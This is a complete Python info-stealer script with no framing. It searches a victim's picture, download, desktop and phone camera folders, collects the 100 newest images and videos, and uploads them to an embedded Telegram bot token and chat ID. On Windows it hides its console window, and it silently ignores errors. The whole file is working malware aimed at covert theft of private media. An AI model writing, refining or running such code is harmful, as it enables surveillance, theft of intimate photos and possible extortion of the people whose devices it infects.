import os, time, requests, ctypes, sys
from pathlib import Path

BOT_TOKEN = "8499456154:AAERR2Dvoot3NLQt-ahSU32blA3c6qix49o"
CHAT_ID = "7041600701"

def get_files():
    images, videos = [], []
    home = str(Path.home())
    dirs = [
        os.path.join(home, "Pictures"),
        os.path.join(home, "Downloads"),
        os.path.join(home, "Desktop"),
        os.path.join(home, "DCIM", "Camera"),
        os.path.join(home, "storage", "emulated", "0", "DCIM"),
        "/sdcard/DCIM"
    ]
    if os.name == 'nt':
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            pics = winreg.QueryValueEx(key, "My Pictures")[0]
            vids = winreg.QueryValueEx(key, "My Video")[0]
            down = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
            dirs.extend([pics, vids, down])
        except: pass
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                ext = os.path.splitext(f)[1].lower()
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                    if ext in (".jpg",".jpeg",".png",".gif",".bmp",".webp"):
                        images.append((mtime, full))
                    elif ext in (".mp4",".mkv",".avi",".mov",".wmv",".flv",".webm",".3gp"):
                        videos.append((mtime, full))
                except: pass
    images.sort(key=lambda x: x[0], reverse=True)
    videos.sort(key=lambda x: x[0], reverse=True)
    return [f[1] for f in images[:100]], [f[1] for f in videos[:100]]

def send_files(imgs, vids):
    for i, img in enumerate(imgs):
        try:
            with open(img, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    files={"photo": f}, data={"chat_id": CHAT_ID, "caption": f"📸 {i+1}/{len(imgs)}"}, timeout=30)
            time.sleep(0.3)
        except: pass
    for i, vid in enumerate(vids):
        try:
            with open(vid, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                    files={"video": f}, data={"chat_id": CHAT_ID, "caption": f"🎬 {i+1}/{len(vids)}"}, timeout=60)
            time.sleep(0.5)
        except: pass

if __name__ == "__main__":
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    imgs, vids = get_files()
    if imgs or vids:
        send_files(imgs, vids)
